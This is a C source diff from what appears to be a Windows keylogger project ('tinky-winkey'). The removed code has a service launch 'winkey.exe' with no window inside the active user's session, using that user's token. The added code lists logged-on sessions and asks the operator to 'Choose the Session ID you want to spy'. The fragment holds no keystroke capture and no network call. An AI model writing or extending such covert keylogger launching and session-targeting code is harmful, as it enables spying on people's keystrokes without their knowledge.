@@ -23,36 +23,75 @@ DWORD GetActiveSessionId(void)
             break;
         }
     }
-    WTSFreeMemory(sessionInfos);    
+    WTSFreeMemory(sessionInfos);
     return activeSession;
 }
 
-VOID LaunchKeylogger(LPPROCESS_INFORMATION keylogInfo)
+static char *GetSessionState(WTS_CONNECTSTATE_CLASS state)
 {
-    DWORD activeSessionId = GetActiveSessionId();
-    if (activeSessionId == 0)
+    switch (state)
     {
-        log("GetActiveSessionId failed.\n");
-        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
-        exit(1);
+    case WTSActive:
+        return "Active";
+        break;
+    case WTSConnected:
+        return "Connected";
+        break;
+    case WTSConnectQuery:
+        return "ConnectQuery";
+        break;
+    case WTSShadow:
+        return "Shadow";
+        break;
+    case WTSDisconnected:
+        return "Disconnected";
+        break;
+    case WTSIdle:
+        return "Idle";
+        break;
+    case WTSListen:
+        return "Listen";
+        break;
+    case WTSReset:
+        return "Reset";
+        break;
+    case WTSDown:
+        return "Down";
+        break;
+    case WTSInit:
+        return "Init";
+        break;
+    default:
+        return "Invalid State";
+        break;
     }
-    char cwd[MAX_PATH];
-    GetCurrentDirectory((DWORD)MAX_PATH, (LPSTR)&cwd);
-    STARTUPINFO sa = {0};
-    HANDLE activeUserToken;
-    BOOL res = WTSQueryUserToken(activeSessionId, &activeUserToken);
-    if (res == FALSE)
+}
+
+DWORD ChooseSessionToLog(void)
+{
+    PWTS_SESSION_INFO_1W sessionsInfos;
+    DWORD nbOfSessions;
+    DWORD level = 1;
+    BOOL sucess = WTSEnumerateSessionsExW(WTS_CURRENT_SERVER_HANDLE, &level, 0, &sessionsInfos, &nbOfSessions);
+    int choice;
+    if (sucess == FALSE)
     {
-        log("WTSQueryUserToken failed.\n");
-        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
-        exit(1);
-    }
-    res =  CreateProcessAsUserA(activeUserToken, "C:\\Users\\Administrateur\\Documents\\tinky-winkey\\winkey.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW, NULL, NULL, &sa, keylogInfo);
-    if (res == FALSE)
+        printf("WTSEnumerateSessionsExA failed.\n");
+        return 0;
+    }  
+    for (DWORD i = 0; i != nbOfSessions; i++)
     {
-        PrintError();
-        log("CreateProcessAsUserA failed.\n");
-        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
-        exit(1);
+        if (sessionsInfos[i].SessionId)
+            printf("Session ID %ld  | User %ls | Domain %ls | State %s\n", sessionsInfos[i].SessionId, sessionsInfos[i].pUserName, sessionsInfos[i].pDomainName, GetSessionState(sessionsInfos[i].State));
     }
+    printf("Choose the Session ID you want to spy :\n");
+    scanf_s("%d", &choice);
+    if (choice >= (int)nbOfSessions || choice < 1 || choice > 20)
+    {
+        printf("Invalid number. Defaulting to active session.\n");
+        WTSFreeMemory(sessionsInfos);
+        return GetActiveSessionId();
+    }
+    WTSFreeMemory(sessionsInfos);
+    return (DWORD)choice;
 }
